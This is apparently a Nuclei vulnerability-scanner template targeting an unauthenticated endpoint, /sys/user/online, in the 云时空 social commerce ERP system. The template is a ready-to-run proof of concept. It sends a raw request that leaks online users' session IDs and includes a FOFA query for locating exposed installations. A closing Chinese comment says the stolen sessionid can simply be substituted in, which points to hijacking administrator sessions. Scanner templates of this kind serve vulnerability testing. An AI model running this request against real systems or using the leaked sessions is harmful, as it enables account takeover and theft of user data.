id: cloudsk-online-unauthenticated
info:
  name: 云时空社会化商业 ERP 系统 user/online - 未授权访问
  author: leadlife
  severity: high
  description: 某时空社会化商业ERP系统 user/online 接口存在身份认证绕过漏洞，未授权的攻击者可利用漏洞url获取在线用户sessionid 导致用户信息泄露，并且切换网站session后可直接接管后台，造成信息泄露或恶意破坏，使系统处于极不安全状态。
  reference: 
    - https://mp.weixin.qq.com/s/ul3fn1iyTLhPbh6WVBbDhA
    - https://github.com/wy876/POC/blob/61b2bf45a165e027ea7014e0bd153f5bf1108b61/%E4%BA%91%E6%97%B6%E7%A9%BA/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9Fonline%E5%AD%98%E5%9C%A8%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="云时空社会化商业ERP系统"
    hunter-query: demo
  tags: cloudsk,unauth,disclsoure

http:
  - raw:
      - |
        GET /sys/user/online HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: close
  
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'sessionid','username','xt','ltime')
        condition: and
      
      # 将得到的 sessionid 替换即可